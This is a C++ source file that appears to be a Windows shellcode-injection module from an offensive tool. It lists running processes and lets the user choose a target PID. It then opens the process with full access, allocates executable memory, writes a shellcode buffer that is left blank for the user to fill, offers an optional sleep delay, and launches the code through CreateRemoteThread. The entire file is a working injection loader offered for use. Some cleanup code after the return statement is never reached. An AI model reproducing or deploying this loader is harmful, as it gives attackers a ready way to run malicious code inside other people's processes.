#include "injectShellcode.h"

PVOID rBuffer;
HANDLE rThread;
HANDLE hProcess;
DWORD processCounter = 0;
DWORD pLevel = 1; 
PWTS_PROCESS_INFO_EX procInfo = NULL; // WTS_PROCESS_INFO_EX structure (has more flags :3) 

int injectShellcode() {

	// CHANGE THIS
	unsigned char buf[] = "";

	printf("%s loaded Shellcode Injection module!\n", ok);

	if (!WTSEnumerateProcessesEx(
		WTS_CURRENT_SERVER,
		&pLevel,
		WTS_ANY_SESSION,
		(LPTSTR*)&procInfo,
		&processCounter
	)) {

		printf("\n%s something went wrong. you're on your own.", er);
		return EXIT_FAILURE;

	}

	printf("%s press any key to continue", in);
	fflush(stdin); // clear input buffer 
	_getch();
	system("cls");
	printf("%s starting process enumeration...\n", in);

	for (DWORD iterator = 1; iterator <= processCounter; iterator++) {

		printf("\n%s %S [%d]\n", in, procInfo->pProcessName, iterator);
		printf("\n\t%s PID (%d)", ok, procInfo->ProcessId);
		printf("\n\t%s session ID (%d)", ok, procInfo->SessionId);
		printf("\n\t%s process name = %S", ok, procInfo->pProcessName);
		printf("\n\t%s process handle count = %d", ok, procInfo->HandleCount);
		printf("\n\t%s number of threads = %d\n", ok, procInfo->NumberOfThreads);
		procInfo++;
	}

	printf("\n%s processes found: %d", ok, processCounter);

	DWORD PID;
	printf("\n%s select a PID to inject into\n\n>>> ", in);
	std::cin >> PID;
	system("cls");
	printf("\n%s PID selected (%d)", in, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("\n%s couldn't attach to %i", er, PID);
		return EXIT_FAILURE;
	}

	printf("\n%s attached to process (%d)\n", ok, PID);

	WCHAR procPath[MAX_PATH];
	DWORD procSize = MAX_PATH;

	if (QueryFullProcessImageNameW(
		hProcess,
		0, // DON'T SET THIS TO PROCESS_NAME_NATIVE (0x00000001)
		procPath,
		&procSize)
		) {

		printf("\n\t%s process path = %ls", in, procPath);

		WCHAR* exeName = wcsrchr(procPath, L'\\');
		if (exeName == NULL) {
			printf("\n\t%s unable to extract name from path", er);
			exeName = procPath;
		}

		else {
			exeName++;
		}

		printf("\n\t%s process name = %ls", in, exeName);
	}

	else {
		printf("\n%s something went wrong. you're on your own. good luck.", er);
		exit(1);
	}

	DWORD arch;
	if (!GetBinaryTypeW(procPath, &arch)) {
		printf("\n\t%s failed to get binary arch.", er);
	}

	switch (arch) {

	case SCS_32BIT_BINARY:
		printf("\n\t%s process architecture = 32-bit", in);
		break;

	case SCS_64BIT_BINARY:
		printf("\n\t%s process architecture = 64-bit", in);
		break;

	case SCS_WOW_BINARY:
		printf("\n\t%s process architecture = 16-bit", in);
		break;

	default:
		printf("\n\t%s process architecture = UNKNOWN.", in);
		break;
	}

	DWORD PROCID = GetProcessId(hProcess);
	printf("\n\t%s process_id = %i", in, PROCID);

	DWORD PROCVERSION = GetProcessVersion(PROCID);
	printf("\n\t%s process_version = %lu", in, PROCVERSION);

	printf("\n\t%s size of shellcode: %i\n", in, (unsigned int)sizeof(buf));
	printf("\n%s starting injection...", in);
	printf("\n%s allocating memory...\n\n", in);
	
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	printf("\t%s VirtualAllocEx() [flProtect ---> PAGE_EXECUTE_READWRITE (RWX)]\n", in);
	printf("\t%s VirtualAllocEx() [flAllocationType ---> MEM_COMMIT | MEM_RESERVE]\n", in);
	printf("\n%s allocated memory", ok);

	printf("\n%s writing to process memory...", in);
	WriteProcessMemory(hProcess, rBuffer, buf, sizeof(buf), NULL);
	printf("\n%s wrote to process memory", ok);

	DWORD sleepTime;

	printf("\n\n%s time to sleep (in seconds)", in);
	printf("\n%s for none/no sleep time, enter in '0' \n\n>>> ", in);
	std::cin >> sleepTime;

	sleepTime *= 1000;

	printf("\n%s creating remote thread...", in);

	if (sleepTime || sleepTime > 0) {

		printf("\n%s sleeping for %ld seconds...", in, (sleepTime / 1000));
		Sleep(sleepTime);

	}

	rThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
	printf("\n%s created remote thread", ok);

	printf("\n%s closing handle to process...", in);
	CloseHandle(hProcess);
	printf("\n%s finished", ok);

	return 0;

	if (!WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, procInfo, processCounter)) {
		printf("\n%s something went wrong. couldn't free the memory. you're on your own.", er);
		return EXIT_FAILURE;
	}

	procInfo = NULL;
	return EXIT_SUCCESS;
	
}